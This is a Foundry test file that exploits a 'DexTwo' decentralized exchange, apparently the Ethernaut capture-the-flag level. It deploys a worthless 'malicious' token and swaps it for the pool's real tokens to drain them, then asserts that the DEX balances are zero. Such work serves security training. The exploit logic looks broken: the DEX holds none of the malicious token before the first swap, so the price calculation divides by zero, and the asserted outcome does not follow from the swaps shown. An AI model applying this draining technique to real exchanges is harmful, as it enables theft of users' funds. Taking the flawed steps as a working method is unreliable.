// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/dex2.sol";  // Import the DexTwo contract

contract DexTwoExploitTest is Test {
    DexTwo dex;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;
    SwappableTokenTwo maliciousToken;

    address player = address(0x123);

    function setUp() public {
        // Deploy the DEX and tokens
        dex = new DexTwo();
        token1 = new SwappableTokenTwo(address(dex), "Token1", "TKN1", 110);
        token2 = new SwappableTokenTwo(address(dex), "Token2", "TKN2", 110);
        maliciousToken = new SwappableTokenTwo(address(dex), "MaliciousToken", "MTK", 1000);

        // Transfer tokens to the player
        token1.transfer(player, 10);
        token2.transfer(player, 10);
        maliciousToken.transfer(player, 500);

        // Add liquidity to the DEX
        token1.approve(address(dex), 100);
        token2.approve(address(dex), 100);
        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);
    }

    function testExploit() public {
        vm.startPrank(player);

        // Approve the DEX to transfer malicious tokens
        maliciousToken.approve(address(dex), 500);

        // Swap malicious tokens for token1
        dex.swap(address(maliciousToken), address(token1), 10);

        // Swap malicious tokens for token2
        dex.swap(address(maliciousToken), address(token2), 10);

        // Swap the remaining malicious tokens to drain the DEX
        dex.swap(address(maliciousToken), address(token1), 490);

        // Check the balances
        assertEq(token1.balanceOf(address(dex)), 0, "DEX should have 0 token1 balance");
        assertEq(token2.balanceOf(address(dex)), 0, "DEX should have 0 token2 balance");

        vm.stopPrank();
    }
}